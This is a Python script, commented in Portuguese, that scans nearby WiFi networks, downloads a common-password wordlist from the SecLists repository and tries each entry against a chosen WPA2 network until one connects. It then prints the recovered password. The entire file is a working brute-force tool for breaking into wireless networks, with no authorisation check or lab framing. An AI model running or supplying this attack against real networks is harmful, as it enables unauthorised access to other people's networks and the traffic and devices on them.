import time
import requests
from pywifi import const
from pywifi import PyWiFi, Profile

def wifi_scan():
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]

    print("Iniciando varredura de redes WiFi...")
    try:
        iface.scan()
    except Exception as e:
        print(f"Erro ao iniciar a varredura: {e}")
        return

    time.sleep(5)  # Aumentar o tempo de espera para garantir a conclusão da varredura
    try:
        scan_results = iface.scan_results()
    except Exception as e:
        print(f"Erro ao obter os resultados da varredura: {e}")
        return

    if not scan_results:
        print("Nenhuma rede WiFi encontrada.")
    else:
        for result in scan_results:
            print(f"SSID: {result.ssid}, Signal: {result.signal}")

def test_password(ssid, password):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(1)
    
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    
    iface.connect(tmp_profile)
    time.sleep(5)

    if iface.status() == const.IFACE_CONNECTED:
        print(f"[+] Conectado com sucesso com a senha: {password}")
        iface.disconnect()
        return True
    else:
        print(f"[-] Falha ao conectar com a senha: {password}")
        return False

def main():
    wifi_scan()
    ssid = input("Digite o SSID da rede WiFi: ")
    password_url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt'

    print("Baixando lista de senhas...")
    try:
        response = requests.get(password_url, timeout=10)
        response.raise_for_status()  # Levanta um erro para status de resposta 4xx/5xx
    except requests.RequestException as e:
        print(f"Falha ao baixar a lista de senhas: {e}")
        return

    passwords = response.text.splitlines()

    for password in passwords:
        password = password.strip()
        if test_password(ssid, password):
            print(f"Senha encontrada: {password}")
            break
    else:
        print("Nenhuma senha funcionou.")

if __name__ == "__main__":
    main()
